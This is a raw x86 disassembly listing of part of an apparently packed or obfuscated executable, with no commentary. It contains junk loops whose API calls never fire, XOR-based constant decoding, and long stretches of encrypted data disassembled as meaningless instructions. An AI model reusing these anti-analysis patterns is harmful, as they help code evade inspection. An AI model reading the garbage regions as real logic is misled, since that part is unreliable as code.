  408ab6:	push   0x69fb
  408abb:	call   DWORD PTR ds:0x42eaac
  408ac1:	mov    ecx,DWORD PTR ds:0x42e76a
  408ac7:	dec    ecx
  408ac8:	mov    DWORD PTR ds:0x42e76a,ecx
  408ace:	jmp    0x408a92
  408ad3:	adc    DWORD PTR ds:0x42e766,0x3f8f
  408add:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  408ae4:	mov    eax,DWORD PTR [ebp-0x4]
  408ae7:	sbb    edx,0xd84
  408aed:	mov    edx,DWORD PTR [ebp+0x10]
  408af0:	xor    DWORD PTR ds:0x4304c2,0x464
  408afa:	mov    ecx,0x7510856
  408aff:	xor    eax,ecx
  408b01:	jmp    0x408cf5
  408b06:	jno    0x408b66
  408b08:	test   bl,ah
  408b0a:	gs in  eax,0x51
  408b0d:	or     BYTE PTR fs:[eax],dh
  408b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b11:	outs   dx,DWORD PTR ds:[esi]
  408b12:	(bad)  
  408b13:	data16 lds sp,DWORD PTR [ebp+0x457e7ed2]
  408b1b:	jg     0x408b9b
  408b1d:	jle    0x408b23
  408b1f:	(bad)  
  408b22:	out    dx,al
  408b23:	mov    ch,0x4d
  408b25:	enter  0xc7f0,0xd7
  408b29:	push   esp
  408b2a:	repnz xchg esp,eax
  408b2c:	mov    dh,0xa2
  408b2e:	das    
  408b2f:	and    bl,dl
  408b31:	mov    ds:0x87651673,eax
  408b36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b37:	ss xor dl,dh
  408b3a:	or     BYTE PTR ds:[ebx-0x5],al
  408b3e:	(bad)
  408b41:	dec    eax
  408b42:	test   DWORD PTR [ecx],edx
  408b44:	fisubr DWORD PTR [ecx+eax*1-0x41]
  408b49:	mov    al,ds:0xf994cded
  408b4e:	sbb    ah,0x67
  408b51:	mov    al,0x1b
  408b53:	(bad)  
  408b55:	enter  0x1d67,0x5a
  408b59:	push   esi
  408b5a:	lods   eax,DWORD PTR ds:[esi]
  408b5b:	iret   
  408b5c:	mov    esp,0x7bf636f4
  408b61:	xlat   BYTE PTR ds:[ebx]
  408b62:	push   0x4250f237
  408b67:	test   eax,0x54476622
  408b6c:	and    bh,BYTE PTR [edi-0x7]
  408b6f:	ins    BYTE PTR es:[edi],dx
  408b70:	scas   eax,DWORD PTR es:[edi]
  408b71:	loop   0x408bcf
  408b73:	jp     0x408b37
  408b75:	jae    0x408b5a
  408b77:	mov    esi,0xe7ed20f4
  408b7c:	xor    DWORD PTR [esp+ecx*2],ebx
  408b7f:	mov    edi,0xbb2342be
  408b84:	and    eax,0xd7690385
  408b8a:	xchg   esi,eax
  408b8b:	loopne 0x408bb8
  408b8d:	sub    edx,DWORD PTR es:[esi-0x63995f33]
  408b94:	jmp    0xe5d4:0x4c1ab192
  408b9b:	ss jp  0x408bcc
  408b9e:	sbb    dl,BYTE PTR [esi-0x3bb23d69]
  408ba4:	into   
  408ba5:	jnp    0x408bfe
  408ba7:	jno    0x408bc0
  408ba9:	fucomip st,st(5)
  408bab:	pusha  
  408bac:	mov    edi,0xb2baa979
  408bb1:	and    al,0x2f
  408bb3:	sub    DWORD PTR [esi-0x40d8f3c9],ebp
  408bb9:	push   0x4d
  408bbb:	pusha  
  408bbc:	(bad)  
  408bbd:	jmp    0x43651d4c
  408bc2:	shl    BYTE PTR [esi-0xc8b6da8],cl
  408bc8:	sbb    DWORD PTR [ebx-0x23e49c67],esi
  408bce:	(bad)  
  408bd0:	adc    BYTE PTR [edi+0x61],bh
  408bd3:	adc    al,0x12
  408bd5:	int3   
  408bd6:	cmp    BYTE PTR [edi-0x73],ch
  408bd9:	in     eax,dx
  408bda:	das    
  408bdb:	(bad)  
  408bdd:	sub    eax,0xf9712282
  408be2:	mov    DWORD PTR ds:0x789fe28f,edi
  408be8:	push   ebx
  408be9:	jp     0x408bba
  408beb:	xchg   ebx,eax
  408bec:	jl     0x408c1b
  408bee:	mov    BYTE PTR [edx],ch
  408bf0:	jns    0x408be9
  408bf2:	dec    ebx
  408bf3:	adc    BYTE PTR [esi-0x355ae6fd],cl
  408bf9:	sub    DWORD PTR [esi],ecx
  408bfb:	ins    BYTE PTR es:[edi],dx
  408bfc:	(bad)  
  408bfd:	in     eax,dx
  408bfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bff:	into   
  408c00:	dec    esp
  408c01:	test   edi,ecx
  408c03:	jno    0x408c69
  408c05:	bswap  ebx
  408c07:	lahf   
  408c08:	mov    ds:0xd5cf74c1,al
  408c0d:	cld    
  408c0e:	xchg   BYTE PTR [esi+0x46],ah
  408c11:	push   0xffffffd8
  408c13:	loopne 0x408c00
  408c15:	stc    
  408c16:	push   cs
  408c17:	cdq    
  408c18:	sbb    al,0x94
  408c1a:	in     al,0xbc
  408c1c:	sub    eax,0x432786ce
  408c21:	xchg   edx,eax
  408c22:	fwait
  408c23:	mov    ds:0xca261053,eax
  408c28:	loope  0x408c62
  408c2a:	push   esp
  408c2b:	std    
  408c2c:	or     ah,BYTE PTR [ecx]
  408c2e:	mov    BYTE PTR [ebx+esi*4],ch
  408c31:	adc    al,0xde
  408c33:	ins    BYTE PTR es:[edi],dx
  408c34:	aaa    
  408c35:	ds or  al,0x27
  408c38:	scas   eax,DWORD PTR es:[edi]
  408c39:	es fwait
  408c3b:	icebp  
  408c3c:	hlt    
  408c3d:	fcmovb st,st(4)
  408c3f:	jle    0x408c3a
  408c41:	or     DWORD PTR [ebx-0x59],ecx
  408c44:	cdq    
  408c45:	fadd   DWORD PTR [ecx-0x7de8230]
  408c4b:	push   0xc469b86b
  408c50:	jg     0x408cca
  408c52:	lock repnz fnstenv [ebp+0x540b7e54]
  408c5a:	push   ds
  408c5b:	fdivrp st(6),st
  408c5d:	jo     0x408c40
  408c5f:	cwde   
  408c60:	pop    eax
  408c61:	hlt    
  408c62:	jmp    FWORD PTR [ecx-0x26]
  408c65:	jecxz  0x408bfa
  408c67:	lods   eax,DWORD PTR ds:[esi]
  408c68:	xor    BYTE PTR [edi+0x76],ah
  408c6b:	(bad)  
  408c6c:	in     eax,dx
  408c6d:	mov    dl,0xa1
  408c6f:	les    esi,FWORD PTR [eax+eax*2-0x7b562ae8]
  408c76:	aam    0xc5
  408c78:	out    0x40,eax
  408c7a:	push   cs
  408c7b:	stos   BYTE PTR es:[edi],al
  408c7c:	mov    dh,0xd9
  408c7e:	sbb    DWORD PTR [ebp+eiz*2+0x66],esi
  408c82:	adc    BYTE PTR [ecx-0x1c],dh
  408c85:	pop    ds
  408c86:	jne    0x408c1e
  408c88:	cs nop
  408c8a:	inc    esi
  408c8b:	mov    ecx,0xcc41b95d
  408c90:	push   es
  408c91:	cli    
  408c92:	pushf  
  408c93:	neg    bh
  408c95:	ja     0x408ca4
  408c97:	jmp    0x408c37
  408c99:	or     al,0x2
  408c9b:	push   eax
  408c9c:	mov    dl,0x1b
  408c9e:	addr16 int 0x4f
  408ca1:	push   ecx
  408ca2:	(bad)  [edx+0x42df9c72]
  408ca8:	test   BYTE PTR [ebp+0x51],dh
  408cab:	retf   
  408cac:	cmp    al,0x1f
  408cae:	icebp  
  408caf:	bound  eax,QWORD PTR [edx]
  408cb1:	test   eax,0xe3e33a78
  408cb6:	jae    0x408cc1
  408cb8:	(bad)  
  408cb9:	fucomp st(7)
  408cbb:	sti    
  408cbc:	and    ebp,eax
  408cbe:	lods   al,BYTE PTR ds:[esi]
  408cbf:	pop    ds
  408cc0:	lods   al,BYTE PTR ds:[esi]
  408cc1:	das    
  408cc2:	pop    esi
  408cc3:	call   DWORD PTR [edx-0x373fc637]
  408cc9:	jge    0x408cfc
  408ccb:	xchg   esi,eax
  408ccc:	call   0x8164988b
  408cd1:	cli    
  408cd2:	aaa    
  408cd3:	jg     0x408d54
  408cd5:	bound  ebp,QWORD PTR [ecx-0x7b6578fe]
  408cdb:	mov    ch,0x2
  408cdd:	xchg   esi,eax
  408cde:	mov    esi,0x3cdb1ba9
  408ce3:	xor    BYTE PTR [esi+0x6fd01059],0xf9
  408cea:	adc    dh,0xab
  408ced:	xlat   BYTE PTR ds:[ebx]
  408cee:	ror    BYTE PTR [edx-0x18b224],1
  408cf4:	jno    0x408cfb
  408cf6:	popf   
  408cf7:	jb     0x408d2b
  408cf9:	add    BYTE PTR [ecx+0x76158b02],cl
  408cff:	add    eax,0x92a10043
  408d04:	add    eax,0xd02b0043
  408d09:	xor    edx,DWORD PTR [edx+eax*1]
  408d0c:	mov    eax,DWORD PTR [ebp+0x14]
  408d0f:	mov    edx,DWORD PTR [ebp+0x10]
  408d12:	mov    DWORD PTR [edx+0x4],eax
  408d15:	mov    eax,DWORD PTR [ebp+0x18]
  408d18:	mov    edx,DWORD PTR [ebp+0x10]
  408d1b:	mov    DWORD PTR [edx+0x8],eax
  408d1e:	mov    eax,DWORD PTR [ebp+0x1c]
  408d21:	mov    edx,DWORD PTR [ebp+0x10]
  408d24:	mov    DWORD PTR [edx+0xc],eax
  408d27:	mov    eax,DWORD PTR [ebp+0x20]
  408d2a:	mov    edx,DWORD PTR [ebp+0x10]
  408d2d:	mov    DWORD PTR [edx+0x10],eax
  408d30:	mov    eax,eax
  408d32:	mov    eax,DWORD PTR [ebp+0x14]
  408d35:	test   eax,eax
  408d37:	mov    eax,DWORD PTR [ebp+0x8]
  408d3a:	jne    0x408f37
  408d40:	mov    eax,DWORD PTR [ebp+0xc]
  408d43:	jmp    0x408f37
  408d48:	test   BYTE PTR [ebx+0x4d],al
  408d4b:	pushf  
  408d4c:	dec    ebp
  408d4d:	pushf  
  408d4e:	inc    ebp
  408d4f:	pop    ebx
  408d50:	cwde   
  408d51:	mov    ss,edx
  408d53:	aaa    
  408d54:	outs   dx,DWORD PTR ds:[esi]
  408d55:	in     al,dx
  408d56:	fisubr DWORD PTR [edi+0x7e7ed48c]
  408d5c:	inc    ebp
  408d5d:	jg     0x408ddd
  408d5f:	jle    0x408d08
  408d61:	pop    esp
  408d62:	loopne 0x408d66
  408d64:	imul   esi,DWORD PTR [eax+0x1a],0x75e42c2c
  408d6b:	ror    edi,cl
  408d6d:	cmp    al,0x7d
  408d6f:	sbb    ch,BYTE PTR [ebx]
  408d71:	xchg   ebp,eax
  408d72:	mov    cl,0xe6
  408d74:	in     al,0x41
  408d76:	push   0xffffffd5
  408d78:	jno    0x408da4
  408d7a:	call   0x7709:0xf69cbf84
  408d81:	xor    al,0x6e
  408d83:	hlt    
  408d84:	jbe    0x408d42
  408d86:	jbe    0x408d24
  408d88:	mov    BYTE PTR [ecx+ebp*8-0x4dd5dd02],dl
  408d8f:	cmp    al,0xf0
  408d91:	xor    DWORD PTR [ecx+0x1d79f88c],edx
  408d97:	jae    0x408e07
  408d99:	sub    al,0x7d
  408d9b:	and    al,0x1
  408d9d:	dec    ebp
  408d9e:	iret   
  408d9f:	icebp  
  408da0:	pop    eax
  408da1:	mov    dh,0xff
  408da3:	ret    
  408da4:	shr    DWORD PTR [edx],1
  408da6:	sahf   
  408da7:	push   ebp
  408da8:	push   ds
  408da9:	push   cs
  408daa:	pop    esi
  408dab:	sub    BYTE PTR [ebp-0x6e],bh
  408dae:	fist   WORD PTR [ecx]
  408db0:	push   esp
  408db1:	xchg   ebx,eax
  408db2:	(bad)  
  408db3:	cmp    eax,DWORD PTR [ebx]
  408db5:	add    eax,0x2d334e86
  408dba:	hlt    
  408dbb:	and    al,0x2d
  408dbd:	in     eax,0xd
  408dbf:	fcmovnu st,st(2)
  408dc1:	cs scas eax,DWORD PTR es:[edi]
  408dc3:	adc    eax,0xdf4670c4
  408dc8:	mov    ebx,0xbeeb2c65
  408dcd:	mov    DWORD PTR [eax],edi
  408dcf:	es and eax,0x227b7812
  408dd5:	push   edi
  408dd6:	(bad)  
  408dd7:	nop
  408dd8:	pop    es
  408dd9:	mov    edx,0xf5c1adc1
  408dde:	(bad)  
  408ddf:	add    BYTE PTR [ecx+0x1d],al
  408de2:	dec    ebp
  408de3:	enter  0xb3b8,0x1e
  408de7:	aam    0x6d
  408de9:	mov    ecx,0xaab26c00
  408dee:	ret    0x45cf
  408df1:	(bad)  
  408df2:	pop    eax
  408df3:	dec    ebx
  408df4:	or     al,0x34
  408df6:	ins    DWORD PTR es:[edi],dx
  408df7:	in     al,dx
  408df8:	sbb    eax,0x1160635a
  408dfd:	push   ebx
  408dfe:	inc    esi
  408dff:	mov    ?,WORD PTR [edi]
  408e01:	jle    0x408e21
  408e03:	and    al,0xbc
  408e05:	jge    0x408e46
  408e07:	ja     0x408d99
  408e09:	lds    esi,FWORD PTR [ecx-0x1315339d]
  408e0f:	loop   0x408dad
  408e11:	ins    DWORD PTR es:[edi],dx
  408e12:	(bad)  [edi]
  408e14:	imul   edx,esp,0x88e14873
  408e1a:	jno    0x408e01
  408e1c:	push   esp
  408e1d:	or     DWORD PTR [ebp-0x5c5ba08a],0xfd90b6a0
  408e27:	cli    
  408e28:	je     0x408e7a
  408e2a:	adc    esp,DWORD PTR [eax]
  408e2c:	or     eax,ecx
  408e2e:	enter  0x5caf,0x41
  408e32:	add    DWORD PTR [ebx-0x87c1441],esp
  408e38:	test   DWORD PTR [esi],0x6d76e07c
  408e3e:	mov    al,0x8e
  408e40:	xor    al,0xba
  408e42:	imul   edx,DWORD PTR [eax],0x60812a3a
  408e48:	(bad)  
  408e49:	icebp  
  408e4a:	pusha  
  408e4b:	add    eax,0x9ba24cdd
  408e50:	test   ch,ah
  408e52:	mov    ch,BYTE PTR [edx+ebx*8]
  408e55:	pop    edi
  408e56:	popf   
  408e57:	outs   dx,BYTE PTR ds:[esi]
  408e58:	sub    eax,0xe891ad45
  408e5d:	push   0xffffffce
  408e5f:	jno    0x408df9
  408e61:	rcl    BYTE PTR [ebx+0x2b],cl
  408e64:	dec    ebp
  408e65:	repz fidivr DWORD PTR [edx+0x3ccf595d]
  408e6c:	mov    eax,ds:0x95ad7295
  408e71:	sub    DWORD PTR [esi],0xffffff90
  408e74:	xchg   edx,eax
  408e75:	inc    ebp
  408e76:	jo     0x408eac
  408e78:	or     esp,DWORD PTR [ecx+0x6c]
  408e7b:	(bad)  
  408e7e:	shl    ebx,0x87
  408e81:	out    0x74,eax
  408e83:	push   bx
  408e85:	and    eax,0x5bdbac54
  408e8a:	pop    edi
  408e8b:	fcom   st(3)
  408e8d:	sub    ecx,edx
  408e8f:	jb     0x408e75
  408e91:	push   ds
  408e92:	mov    esi,0x2083992b
  408e97:	cmc    
  408e98:	popf   
  408e99:	jmp    ebp
  408e9b:	aas    
  408e9c:	adc    edi,eax
  408e9e:	in     al,0x4b
  408ea0:	adc    al,0xae
  408ea2:	int3   
  408ea3:	hlt    
  408ea4:	call   0x7161:0x131f2090
  408eab:	ins    BYTE PTR es:[di],dx
  408ead:	jecxz  0x408e54
  408eaf:	gs add al,dl
  408eb2:	gs cdq 
  408eb4:	sti    
  408eb5:	jnp    0x408ee5
  408eb7:	xchg   esi,edx
  408eb9:	dec    BYTE PTR [ecx+0x577a5475]
  408ebf:	arpl   WORD PTR [ebx+0x7f],ax
  408ec2:	inc    ecx
  408ec3:	repnz xchg ah,dh
  408ec6:	mov    ds:0x4e8fdf76,eax
  408ecb:	push   ecx
  408ecc:	jle    0x408f3d
  408ece:	stc    
  408ecf:	(bad)  
  408ed1:	scas   al,BYTE PTR es:[edi]
  408ed2:	hlt    
  408ed3:	clc    
  408ed4:	in     al,0xf9
  408ed6:	push   0xffffffbf
  408ed8:	mov    cr3,esp
  408edb:	add    ecx,DWORD PTR [edi+0x40]
  408ede:	popa   
  408edf:	push   eax
  408ee0:	sbb    esp,ebp
  408ee2:	rol    DWORD PTR ds:0xf0a7,cl
  408ee7:	or     edx,esi
  408ee9:	adc    DWORD PTR ds:0x53f3c4b2,0x43816305
  408ef3:	ja     0x408ea5
  408ef5:	sub    DWORD PTR [eax-0x6ad25865],eax
  408efb:	ror    cl,cl
  408efd:	cmp    ebp,ecx
  408eff:	jmp    0x408f0d
  408f01:	pushf  
  408f02:	call   0x894c:0xc2030e51
  408f09:	inc    esi
  408f0a:	push   edx
  408f0b:	sub    DWORD PTR [ebp+0x513b83f3],ebx
  408f11:	js     0x408ee5
  408f13:	hlt    
  408f14:	xchg   ebx,eax
  408f15:	cmp    DWORD PTR [ecx],0x48
  408f18:	call   FWORD PTR [esi+0x1cbf9645]
  408f1e:	mov    esi,0xd9cad7b3
  408f23:	push   0x66dac678
  408f28:	js     0x408eae
  408f2a:	out    0x5,eax
  408f2c:	mov    eax,ds:0x997f25d4
  408f31:	jnp    0x408f76
  408f33:	int    0x48
  408f35:	or     DWORD PTR ds:0x9d05c133,esp
  408f3b:	jb     0x408f6f
  408f3d:	add    cl,cl
  408f3f:	ret    0x1c
  408f42:	push   ebp
  408f43:	mov    ebp,esp
  408f45:	sub    esp,0x10c
  408f4b:	push   ebx
  408f4c:	sbb    DWORD PTR ds:0x42ee08,0x42e76a
  408f56:	push   esi
  408f57:	push   edi
  408f58:	xor    DWORD PTR ds:0x430546,0x5477
  408f62:	push   0x412320
  408f67:	sbb    DWORD PTR ds:0x42ee28,0x42e766
  408f71:	call   DWORD PTR ds:0x42ea4c
  408f77:	sbb    DWORD PTR ds:0x42e762,0x6315
  408f81:	test   eax,eax
  408f83:	je     0x408f9a
  408f89:	or     DWORD PTR ds:0x4304ae,0x658e
  408f93:	xor    eax,eax
  408f95:	jmp    0x40a1a9
  408f9a:	or     DWORD PTR ds:0x4304b2,0x1a2e
  408fa4:	push   0x412364
  408fa9:	call   DWORD PTR ds:0x42eb04
  408faf:	sbb    DWORD PTR ds:0x430552,0x34b4
  408fb9:	test   ax,ax
  408fbc:	mov    DWORD PTR ds:0x42e75a,0xd26
  408fc6:	je     0x408feb
  408fcc:	push   0x786876
  408fd1:	push   0x55897097
  408fd6:	adc    DWORD PTR ds:0x4304c2,0x42ee08
  408fe0:	call   DWORD PTR ds:0x42eb80
  408fe6:	jmp    0x40a1a9
  408feb:	sub    DWORD PTR ds:0x42ee24,0x1c30
  408ff5:	call   DWORD PTR ds:0x42eb44
  408ffb:	cdq    
  408ffc:	cmp    eax,0x67876766
  409001:	mov    DWORD PTR ds:0x43055a,0x4f36
  40900b:	jne    0x409041
  409011:	cmp    edx,0x86189768
  409017:	mov    DWORD PTR ds:0x42ee14,0x24b9
  409021:	jne    0x409041
  409027:	sub    DWORD PTR ds:0x42e762,0x452
  409031:	push   0x412380
  409036:	call   DWORD PTR ds:0x42ea3c
  40903c:	jmp    0x40a1a9
  409041:	neg    DWORD PTR ds:0x4304aa
  409047:	push   0x4123e0
  40904c:	adc    DWORD PTR ds:0x42ee24,0x43049a
  409056:	call   DWORD PTR ds:0x42eadc
  40905c:	test   ax,ax
  40905f:	jne    0x408f89
  409065:	and    DWORD PTR ds:0x42e762,0x0
  40906f:	xor    ebx,ebx
  409071:	xor    ebx,DWORD PTR ds:0x42e762
  409077:	inc    ebx
  409078:	mov    DWORD PTR ds:0x42e762,ebx
  40907e:	cmp    DWORD PTR ds:0x42e762,0x28
  409085:	jne    0x409097
  40908b:	push   DWORD PTR [ebp-0x10]
  40908e:	push   DWORD PTR [ebp-0x18]
  409091:	call   DWORD PTR ds:0x42ebac
  409097:	cmp    DWORD PTR ds:0x42e762,0x1c
  40909e:	jb     0x40906f
  4090a4:	mov    edx,DWORD PTR ds:0x42ee14
  4090aa:	and    DWORD PTR ds:0x42ee20,edx
  4090b0:	mov    ecx,0xf89c8535
  4090b5:	movzx  edx,BYTE PTR ds:0x43048e
  4090bc:	sbb    edx,DWORD PTR ds:0x43054e
  4090c2:	mov    DWORD PTR ds:0x43048e,edx
  4090c8:	mov    DWORD PTR [ebp-0x20],ecx
  4090cb:	and    DWORD PTR ds:0x43049e,0x0
  4090d5:	mov    edx,DWORD PTR ds:0x43049e
  4090db:	inc    edx
  4090dc:	mov    DWORD PTR ds:0x43049e,edx
  4090e2:	cmp    DWORD PTR ds:0x43049e,0x21
  4090e9:	jne    0x409109
  4090ef:	push   0x59b7
  4090f4:	push   0x42e77a
  4090f9:	push   0x42e8ad
  4090fe:	push   0x7470
  409103:	call   DWORD PTR ds:0x42ebb0
  409109:	cmp    DWORD PTR ds:0x43049e,0x15
  409110:	jb     0x4090d5
  409116:	and    DWORD PTR ds:0x42e766,0x0
  409120:	mov    edx,DWORD PTR ds:0x42e766
  409126:	inc    edx
  409127:	mov    DWORD PTR ds:0x42e766,edx
  40912d:	cmp    DWORD PTR ds:0x42e766,0x20
  409134:	jne    0x40914a
  40913a:	push   0x704d
  40913f:	push   0x180e
  409144:	call   DWORD PTR ds:0x42eab0
  40914a:	cmp    DWORD PTR ds:0x42e766,0x13
  409151:	jb     0x409120
  409157:	adc    DWORD PTR ds:0x43049a,edi
  40915d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409164:	and    DWORD PTR ds:0x43048a,0x0
  40916e:	mov    esi,DWORD PTR ds:0x43048a
  409174:	inc    esi
  409175:	mov    DWORD PTR ds:0x43048a,esi
  40917b:	cmp    DWORD PTR ds:0x43048a,0xd
  409182:	jne    0x40919d
  409188:	push   0x42e87b
  40918d:	push   0x42e77a
  409192:	push   0x400000
  409197:	call   DWORD PTR ds:0x42eac8
  40919d:	cmp    DWORD PTR ds:0x43048a,0xc
  4091a4:	jne    0x4091b7
  4091aa:	mov    esi,DWORD PTR ds:0x43048a
  4091b0:	inc    esi
  4091b1:	mov    DWORD PTR ds:0x43048a,esi
  4091b7:	cmp    DWORD PTR ds:0x43048a,0x14
  4091be:	jb     0x40916e
  4091c4:	sub    esi,DWORD PTR ds:0x42ee1c
  4091ca:	lea    eax,[ebp-0x58]
  4091cd:	mov    DWORD PTR [ebp-0x60],eax
  4091d0:	add    esi,esi
  4091d2:	lea    eax,[ebp-0x50]
  4091d5:	inc    ebx
  4091d6:	mov    DWORD PTR [ebp-0x10],eax
  4091d9:	inc    esi
  4091da:	mov    eax,ds:0x4121a8
  4091df:	mov    eax,DWORD PTR [eax+0x1c8]
  4091e5:	or     DWORD PTR ds:0x43054e,0x4304a2
  4091ef:	mov    eax,DWORD PTR [eax]
  4091f1:	add    esi,ebx
  4091f3:	mov    edx,DWORD PTR [ebp-0x10]
  4091f6:	xor    esi,esi
  4091f8:	xor    esi,DWORD PTR ds:0x43054e
  4091fe:	adc    DWORD PTR ds:0x42ee18,esi
  409204:	mov    esi,0x7510856
  409209:	xor    DWORD PTR ds:0x43048e,ebx
  40920f:	xor    eax,esi
  409211:	mov    ebx,0x32729d
  409216:	add    eax,ebx
  409218:	mov    DWORD PTR [edx],eax
  40921a:	mov    eax,ds:0x43048e
  40921f:	mov    eax,ds:0x4124e4
  409224:	cmp    eax,0x23d14057
  409229:	mov    eax,DWORD PTR [ebp-0x18]
  40922c:	mov    DWORD PTR ds:0x43048e,0x7d60
  409236:	je     0x409262
  40923c:	mov    ecx,DWORD PTR [ebp-0x20]
  40923f:	xor    eax,esi
  409241:	adc    DWORD PTR ds:0x43049e,0x4304ba
  40924b:	add    eax,ebx
  40924d:	imul   eax,ecx
  409250:	mov    DWORD PTR ds:0x4304ae,0x73a3
  40925a:	mov    DWORD PTR [ebp-0x20],eax
  40925d:	jmp    0x409dc0
  409262:	xor    eax,esi
  409264:	adc    edx,0x5f1b
  40926a:	add    eax,ebx
  40926c:	mov    ds:0x4122b8,eax
  409271:	mov    edx,DWORD PTR ds:0x4304e2
  409277:	mov    eax,ds:0x42e99c
  40927c:	sub    eax,edx
  40927e:	or     edx,DWORD PTR [edx+eax*1]
  409281:	mov    eax,DWORD PTR [ebp-0x20]
  409284:	xor    eax,esi
  409286:	add    eax,ebx
  409288:	mov    ds:0x4124e4,eax
  40928d:	sub    DWORD PTR ds:0x42e76e,0x78a9
  409297:	mov    eax,DWORD PTR [ebp-0x18]
  40929a:	add    edx,DWORD PTR ds:0x4304aa
  4092a0:	mov    edx,DWORD PTR ds:0x4122b8
  4092a6:	neg    DWORD PTR ds:0x4304ba
  4092ac:	xor    eax,esi
  4092ae:	dec    DWORD PTR ds:0x4304b2
  4092b4:	add    eax,ebx
  4092b6:	mov    DWORD PTR ds:0x430556,0x3216
  4092c0:	cmp    edx,eax
  4092c2:	jne    0x409dc0
  4092c8:	mov    eax,DWORD PTR [ebp-0x18]
  4092cb:	add    edx,0x2278
  4092d1:	mov    DWORD PTR [ebp-0x30],eax
  4092d4:	mov    eax,DWORD PTR [ebp-0x20]
  4092d7:	mov    DWORD PTR ds:0x42ee20,0x10
  4092e1:	cmp    DWORD PTR ds:0x42ee20,0x0
  4092e8:	je     0x409328
  4092ee:	cmp    DWORD PTR ds:0x42ee20,0x16
  4092f5:	jne    0x409310
  4092fb:	push   0x55c8
  409300:	push   0x6c0c
  409305:	push   0x400000
  40930a:	call   DWORD PTR ds:0x42eacc
  409310:	mov    edi,DWORD PTR ds:0x42ee20
  409316:	dec    edi
  409317:	mov    DWORD PTR ds:0x42ee20,edi
  40931d:	jmp    0x4092e1
  409322:	add    DWORD PTR ds:0x42ee14,ebx
  409328:	mov    DWORD PTR [ebp-0x1c],eax
  40932b:	or     DWORD PTR ds:0x42e776,0x513d
  409335:	mov    eax,ds:0x4121a8
  40933a:	mov    eax,DWORD PTR [eax+0x198]
  409340:	not    edx
  409342:	mov    DWORD PTR [ebp-0xc],eax
  409345:	xor    edx,edx
  409347:	add    edx,DWORD PTR ds:0x42e772
  40934d:	adc    edx,DWORD PTR ds:0x4304c2
  409353:	mov    DWORD PTR ds:0x42e772,edx
  409359:	mov    eax,DWORD PTR [ebp-0x1c]
  40935c:	mov    edx,DWORD PTR [ebp-0xc]
  40935f:	and    DWORD PTR ds:0x42ee2c,0x0
  409369:	mov    edi,DWORD PTR ds:0x42ee2c
  40936f:	inc    edi
  409370:	mov    DWORD PTR ds:0x42ee2c,edi
  409376:	cmp    DWORD PTR ds:0x42ee2c,0x6
  40937d:	jne    0x409391
  409383:	push   DWORD PTR [ebp-0x10]
  409386:	push   0x42e766
  40938b:	call   DWORD PTR ds:0x42ebb4
  409391:	cmp    DWORD PTR ds:0x42ee2c,0x5
  409398:	jne    0x4093ad
  40939e:	xor    edi,edi
  4093a0:	xor    edi,DWORD PTR ds:0x42ee2c
  4093a6:	inc    edi
  4093a7:	mov    DWORD PTR ds:0x42ee2c,edi
  4093ad:	cmp    DWORD PTR ds:0x42ee2c,0x1b
  4093b4:	jb     0x409369
  4093ba:	xor    DWORD PTR ds:0x4304b2,0x56f9
  4093c4:	xor    eax,esi
  4093c6:	and    DWORD PTR ds:0x42ee28,0x0
  4093d0:	jmp    0x4093e2
  4093d5:	mov    edi,DWORD PTR ds:0x42ee28
  4093db:	inc    edi
  4093dc:	mov    DWORD PTR ds:0x42ee28,edi
  4093e2:	cmp    DWORD PTR ds:0x42ee28,0x1f
  4093e9:	jae    0x40946a
  4093ef:	cmp    DWORD PTR ds:0x42ee28,0x6
  4093f6:	jne    0x409402
  4093fc:	call   DWORD PTR ds:0x42ead0
  409402:	cmp    DWORD PTR ds:0x42ee28,0x5
  409409:	jne    0x40941c
  40940f:	mov    edi,DWORD PTR ds:0x42ee28
  409415:	inc    edi
  409416:	mov    DWORD PTR ds:0x42ee28,edi
  40941c:	jmp    0x4093d5
  409421:	mov    DWORD PTR ds:0x42ee0c,0x12
  40942b:	cmp    DWORD PTR ds:0x42ee0c,0x0
  409432:	je     0x40946a
  409438:	cmp    DWORD PTR ds:0x42ee0c,0x21
  40943f:	jne    0x409450
  409445:	push   0x79c1
  40944a:	call   DWORD PTR ds:0x42eab4
  409450:	xor    edi,edi
  409452:	or     edi,DWORD PTR ds:0x42ee0c
  409458:	dec    edi
  409459:	mov    DWORD PTR ds:0x42ee0c,edi
  40945f:	jmp    0x40942b
  409464:	and    edi,DWORD PTR ds:0x43055a
  40946a:	add    eax,ebx
  40946c:	mov    DWORD PTR [edx],eax
  40946e:	lea    eax,[ebp-0x14]
  409471:	and    edi,DWORD PTR ds:0x43048a
  409477:	mov    DWORD PTR [ebp-0x44],eax
  40947a:	mov    edi,DWORD PTR ds:0x43049e
  409480:	adc    edi,DWORD PTR ds:0x42ee18
  409486:	mov    DWORD PTR ds:0x43049e,edi
  40948c:	mov    eax,DWORD PTR [ebp-0x1c]
  40948f:	sbb    DWORD PTR ds:0x42ee30,0x42e76a
  409499:	mov    edx,DWORD PTR [ebp-0x44]
  40949c:	sbb    DWORD PTR ds:0x42ee20,0x4304ba
  4094a6:	xor    eax,esi
  4094a8:	add    eax,ebx
  4094aa:	movzx  edi,WORD PTR ds:0x4304c2
  4094b1:	and    DWORD PTR ds:0x4304be,edi
  4094b7:	mov    DWORD PTR [edx],eax
  4094b9:	add    DWORD PTR ds:0x42e776,0x43049a
  4094c3:	mov    DWORD PTR [ebp-0x54],ecx
  4094c6:	or     edi,edi
  4094c8:	lea    eax,[ebp-0x54]
  4094cb:	mov    DWORD PTR [ebp-0x10],eax
  4094ce:	sub    ecx,DWORD PTR ds:0x4304a6
  4094d4:	mov    eax,DWORD PTR [ebp-0x54]
  4094d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4094da:	mov    DWORD PTR ds:0x42ee2c,0x1c
  4094e4:	cmp    DWORD PTR ds:0x42ee2c,0x0
  4094eb:	je     0x409533
  4094f1:	cmp    DWORD PTR ds:0x42ee2c,0x27
  4094f8:	jne    0x40950c
  4094fe:	push   DWORD PTR [ebp-0x20]
  409501:	push   0x215b
  409506:	call   DWORD PTR ds:0x42ebb8
  40950c:	xor    edi,edi
  40950e:	xor    edi,DWORD PTR ds:0x42ee2c
  409514:	dec    edi
  409515:	mov    DWORD PTR ds:0x42ee2c,edi
  40951b:	jmp    0x4094e4
  409520:	movzx  edi,BYTE PTR ds:0x42e76a
